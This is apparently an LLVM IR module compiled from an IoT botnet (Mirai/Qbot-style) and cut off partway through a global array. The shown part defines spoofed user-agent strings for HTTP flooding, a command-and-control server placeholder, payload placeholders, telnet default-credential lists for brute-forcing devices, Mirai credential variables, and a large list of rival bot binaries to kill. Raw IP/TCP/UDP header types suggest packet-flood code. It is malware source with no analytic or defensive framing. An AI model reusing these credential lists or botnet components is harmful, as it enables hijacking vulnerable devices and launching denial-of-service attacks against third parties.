; ModuleID = 'host/ir_bcf/Yummy.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [11 x i8] c"IP:BOTPORT\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.60 = private unnamed_addr constant [11 x i8] c"BB PAYLOAD\00", align 1
@Payload = global i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [8 x i8] c"PAYLOAD\00", align 1
@Telnet_Usernames = global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.66 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@Telnet_Passwords = global [19 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0)], align 16
@.str.68 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.69 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.70 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.71 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.72 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.73 = private unnamed_addr constant [10 x i8] c"OxhlwSG8\00\00", align 1
@.str.74 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.75 = private unnamed_addr constant [14 x i8] c"7ujMko0admin\00\00", align 1
@.str.76 = private unnamed_addr constant [7 x i8] c"vizxv\00\00", align 1
@Mirai_Usernames = global [1 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 8
@Mirai_Passwords = global [1 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.68, i32 0, i32 0)], align 8
@Bot_Killer_Binarys = global [355 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 